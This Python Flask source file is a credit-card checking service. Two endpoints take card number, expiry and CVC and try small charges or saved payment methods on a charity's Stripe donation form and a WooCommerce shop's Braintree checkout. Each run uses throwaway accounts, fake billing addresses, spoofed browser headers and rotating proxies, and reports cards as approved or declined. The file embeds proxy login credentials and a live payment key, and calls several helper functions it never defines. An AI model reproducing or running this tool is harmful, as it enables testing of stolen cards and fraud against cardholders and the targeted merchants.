from flask import Flask, request, jsonify
from datetime import datetime
import random
import string
import requests
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import base64

app = Flask(__name__)

REQUEST_TIMEOUT = 500
PROXIES = [
    'http://purevpn0s11664812:5TUjjTyn6G6DJl@px591701.pointtoserver.com:10780',
    'http://purevpn0s11664812:5TUjjTyn6G6DJl@px591801.pointtoserver.com:10780',
    'http://purevpn0s11664812:5TUjjTyn6G6DJl@px711001.pointtoserver.com:10780',
    'http://purevpn0s11664812:5TUjjTyn6G6DJl@px510201.pointtoserver.com:10780',
    'http://purevpn0s11664812:5TUjjTyn6G6DJl@px022409.pointtoserver.com:10780',
    'http://purevpn0s11664812:5TUjjTyn6G6DJl@px300902.pointtoserver.com:10780',
    'http://purevpn0s11664812:5TUjjTyn6G6DJl@px130501.pointtoserver.com:10780',
]

def choose_proxy(proxies_list):
    if not proxies_list:
        return None
    line = random.choice(proxies_list)
    return {"http": line, "https": line}

def gets(s, start, end):
    try:
        return s.split(start)[1].split(end)[0]
    except IndexError:
        return None

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def clean_response(raw_msg: str) -> str:
    return BeautifulSoup(raw_msg, "html.parser").get_text().strip()

def validate_card_input(card_input):
    if not card_input:
        return False, "Missing 'card' data"
    parts = card_input.strip().split('|')
    if len(parts) != 4 or not all(part.isdigit() for part in parts):
        return False, "Card format invalid. Expected number|mm|yy|cvc with numeric parts."
    n, mm, yy, cvc = parts
    if not (13 <= len(n) <= 19):
        return False, "Invalid card number length."
    if not (1 <= int(mm) <= 12):
        return False, "Invalid month."
    if len(cvc) < 3:
        return False, "CVC too short."
    if len(mm) == 1:
        mm = f'0{mm}'
    if len(yy) == 4:
        yy = yy[2:]
    try:
        exp_date = datetime.strptime(f"{mm}/20{yy}", "%m/%Y")
        if exp_date < datetime.now():
            return False, "Card expired."
    except ValueError:
        return False, "Invalid expiry date."
    return True, (n, mm, yy, cvc)

@app.route('/')
def home():
    return "API is running. Use /st or /b3_npnbet endpoints."

@app.route('/st', methods=['GET', 'POST'])
def check_card_gate2():
    if request.method == 'POST':
        data = request.get_json(force=True)
        card_input = data.get('card')
    else:
        card_input = request.args.get('card')

    valid, result = validate_card_input(card_input)
    if not valid:
        return jsonify({"error": result}), 400

    n, mm, yy, cvc = result
    proxy = choose_proxy(PROXIES)
    acc = generate_random_account()
    user_agent = generate_user_agent()

    try:
        with requests.Session() as r:
            r.proxies = proxy or {}
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i',
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }

            # Fetch nonce
            response = r.get('https://www.angelflightab.ca/donate/', headers=headers, timeout=REQUEST_TIMEOUT, proxies=proxy)
            nonce = gets(response.text,'"validate_form_nonce":"','"')

            # Post form - step 2
            files = {
                'input_10': (None, '‬‏'),
                'input_1': (None, acc),
                'input_2': (None, '$ 0.50 CAD'),
                'input_11': (None, ''),
                'input_6.1': (None, ''),
                'input_6.3': (None, ''),
                'input_6.4': (None, ''),
                'input_6.5': (None, ''),
                'input_6.6': (None, 'Egypt'),
                'input_3': (None, '$ 0.50 CAD'),
                'gform_ajax': (None, 'form_id=1&title=&description=&tabindex=0&theme=gravity-theme&hash=81b273e155b8cedf2237cb9995f42720'),
                'gform_submission_method': (None, 'iframe'),
                'gform_theme': (None, 'gravity-theme'),
                'gform_style_settings': (None, ''),
                'is_submit_1': (None, '1'),
                'gform_submit': (None, '1'),
                'gform_unique_id': (None, ''),
                'state_1': (None, 'WyJbXSIsIjg4YWNiMmMzZWE2MGRkNGQ3ZDgyY2IxY2Y5M2JjNjRkIl0='),
                'gform_target_page_number_1': (None, '2'),
                'gform_source_page_number_1': (None, '1'),
                'gform_field_values': (None, ''),
                'ak_hp_textarea': (None, ''),
                'ak_js': (None, '1761854850113'),
                'gf_zero_spam_key': (None, '2OJpDWLsAoJbJgpcvPaJJklgIPsFrSJFsfC2THLBp3WIWvaySPkgHiWAfeVoDGxf'),
            }
            response = r.post('https://www.angelflightab.ca/donate/', headers=headers, files=files, timeout=REQUEST_TIMEOUT, proxies=proxy)

            # Post admin ajax - step 3
            headers_ajax = {
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'origin': 'https://www.angelflightab.ca',
                'priority': 'u=1, i',
                'referer': 'https://www.angelflightab.ca/donate/',
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent,
            }
            files_list = [
                ('input_10', (None, '‬‏')),
                ('input_1', (None, acc)),
                ('input_2', (None, '$ 0.50 CAD')),
                ('input_11', (None, '')),
                ('input_6.1', (None, '44-46 High Street')),
                ('input_6.3', (None, 'Aberlour')),
                ('input_6.4', (None, 'edt')),
                ('input_6.5', (None, '10080')),
                ('input_6.6', (None, 'United States')),
                ('input_3', (None, '$ 0.50 CAD')),
                ('gform_submission_method', (None, 'iframe')),
                ('gform_theme', (None, 'gravity-theme')),
                ('gform_style_settings', (None, '')),
                ('is_submit_1', (None, '1')),
                ('gform_unique_id', (None, '68fd03a635cef')),
                ('state_1', (None, 'WyJbXSIsIjg4YWNiMmMzZWE2MGRkNGQ3ZDgyY2IxY2Y5M2JjNjRkIl0=')),
                ('gform_target_page_number_1', (None, '0')),
                ('gform_source_page_number_1', (None, '2')),
                ('gform_field_values', (None, '')),
                ('ak_hp_textarea', (None, '')),
                ('ak_js', (None, '1761412008103')),
                ('version_hash', (None, '2467c694c0bce0b662849b934f32ed85')),
                ('gf_zero_spam_key', (None, '2OJpDWLsAoJbJgpcvPaJJklgIPsFrSJFsfC2THLBp3WIWvaySPkgHiWAfeVoDGxf')),
                ('action', (None, 'gfstripe_validate_form')),
                ('feed_id', (None, '1')),
                ('form_id', (None, '1')),
                ('tracking_id', (None, 'mavfh15j')),
                ('payment_method', (None, 'card')),
                ('nonce', (None, nonce)),
                ('gform_ajax--stripe-temp', (None, 'form_id=1&title=&description=&tabindex=0&theme=gravity-theme&hash=81b273e155b8cedf2237cb9995f42720')),
            ]

            response = r.post('https://www.angelflightab.ca/wp-admin/admin-ajax.php', headers=headers_ajax,
                              files=files_list, timeout=REQUEST_TIMEOUT, proxies=proxy)

            client_secret = gets(response.text, '"client_secret":"', '","')
            resume_token = gets(response.text, '"resume_token":"', '","')
            tracking_id = gets(response.text, '"tracking_id":"', '","')
            pi = gets(response.text, '{"id":"', '","object')

            headers_confirm = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user_agent,
            }
            data_confirm = {
                'return_url': f'https://www.angelflightab.ca/donate/?resume_token={resume_token}&feed_id=1&form_id=1&tracking_id={tracking_id}',
                'payment_method_data[billing_details][address][line1]': '44-46 High Street',
                'payment_method_data[billing_details][address][city]': 'Aberlour',
                'payment_method_data[billing_details][address][state]': 'edt',
                'payment_method_data[billing_details][address][postal_code]': '10080',
                'payment_method_data[billing_details][address][country]': 'US',
                'payment_method_data[billing_details][email]': acc,
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': n,
                'payment_method_data[card][cvc]': cvc,
                'payment_method_data[card][exp_year]': yy,
                'payment_method_data[card][exp_month]': mm,
                'key': 'pk_live_51JgnotGmZDU7MpFJxzykqGVMkTVjZ23MFvQUvx01tjmYgKVHlgZVZzHekrE3hagbJV3e0LPsnyyp8b8AcKVuu9pw00J0IYbqze',
                'client_secret': client_secret,
            }

            response = r.post(f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
                              timeout=REQUEST_TIMEOUT, proxies=proxy,
                              headers=headers_confirm, data=data_confirm)

            try:
                resp_json = response.json()

                if 'error' in resp_json:
                    error = resp_json['error']
                    message = error.get('message', 'Card declined.')
                    decline_code = error.get('decline_code', '')
                    if decline_code:
                        message = f"{message} (Decline code: {decline_code})"
                    status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
                else:
                    message = "Payment successful"
                    status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            except Exception as e:
                message = f"Error processing payment response: {str(e)}"
                status = "𝗘𝗿𝗿𝗼𝗿 ❌"

            return jsonify({
                "status": True,
                "lista": card_input,
                "Status": status,
                "Response": message,
            })

    except requests.exceptions.RequestException as e:
        return jsonify({"status": False, "message": "Network or proxy error: " + str(e)}), 500

@app.route('/b3_npnbet', methods=['GET'])
def b3_npnbet():
    start_time = time.time()
    
    lista = request.args.get('lista')
    if not lista:
        return jsonify({"error": "Missing 'lista' parameter"}), 400
    
    separa = lista.split("|")
    cc = separa[0]
    mes = separa[1].lstrip("0")
    ano = separa[2]
    if len(ano) == 2:
        ano = "20" + ano
    cvv = separa[3]

    email = generate_random_string(10) + "@mos.in"
    
    session = requests.Session()
    proxies = {
        "http": "http://eleona:eleona1@zxo.run.place:6969",
        "https": "http://eleona:eleona1@zxo.run.place:6969",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42"
    }
    
    # 1. Get random user details
    r0 = session.get('https://randomuser.me/api/1.2/?nat=us', headers=headers, proxies=proxies, verify=False)
    postcode = get_str(r0.text, '"postcode":', ',"')
    street = get_str(r0.text, '"street":"', '"')

    # 2. Get registration nonce
    r1 = session.get('https://www.calipercovers.com/my-account/', headers=headers, proxies=proxies, verify=False)
    import re
    rnonce_match = re.search(r'name="woocommerce-register-nonce" value="(.+?)"', r1.text)
    rnonce = rnonce_match.group(1) if rnonce_match else ''

    # 3. Register user
    r2 = session.post('https://www.calipercovers.com/my-account/', data={
        "username": email,
        "email": email,
        "woocommerce-register-nonce": rnonce,
        "register": "Register",
        "_wp_http_referer": "/my-account/add-payment-method/"
    }, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}, proxies=proxies, verify=False)
    anonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.+?)"', r2.text)
    anonce = anonce_match.group(1) if anonce_match else ''

    T = get_str(r2.text, 'var wc_braintree_client_token = ["', '"]')
    TK = base64.b64decode(T).decode() if T else ''
    au = get_str(TK, '"authorizationFingerprint":"', '",')

    # 4. Tokenize Card via GraphQL
    graphql_json = {
        "clientSdkMetadata": {"source":"client","integration":"custom","sessionId":"f6f02741-3616-48dc-8a31-d8e93e7a7122"},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv,
                    "billingAddress": {"postalCode": postcode, "streetAddress": street}
                },
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    graphql_headers = {
        **headers,
        "Content-Type": "application/json",
        "Authorization": f"Bearer {au}",
        "Braintree-Version": "2018-05-10"
    }
    r5 = session.post('https://payments.braintree-api.com/graphql', json=graphql_json, headers=graphql_headers, proxies=proxies, verify=False)
    token = get_str(r5.text, '"token":"', '"')

    # 5. Add payment method
    post_data_5 = {
        "payment_method": "braintree_cc",
        "braintree_cc_nonce_key": token,
        "braintree_cc_device_data": '{"device_session_id":"3718a772345fd032c196a6a94a65a39c","fraud_merchant_id":null,"correlation_id":"27684b31b1a9bec0e402d1986d933b23"}',
        "braintree_cc_3ds_nonce_key": "",
        "braintree_cc_config_data": '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/ttgvnw962cj2p7m5/client_api","assetsUrl":"https://assets.braintreegateway.com", ...}',
        "woocommerce-add-payment-method-nonce": anonce,
        "_wp_http_referer": "/my-account/add-payment-method/",
        "woocommerce_add_payment_method": "1"
    }
    r6 = session.post('https://www.calipercovers.com/my-account/add-payment-method/', data=post_data_5, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}, proxies=proxies, verify=False)

    raw_msg = get_str(r6.text, 'There was an error saving your payment method. Reason: ', '</div>')
    clean_msg = raw_msg.strip()

    if clean_msg:
        status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
        message = clean_msg
    elif "Payment method successfully added." in r6.text:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        message = "Payment method successfully added."
    else:
        status = None
        message = None

    elapsed = time.time() - start_time

    return jsonify({
        "status": True,
        "lista": lista,
        "Status": status,
        "Response": message,
        "Took": format_decimal(elapsed),
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
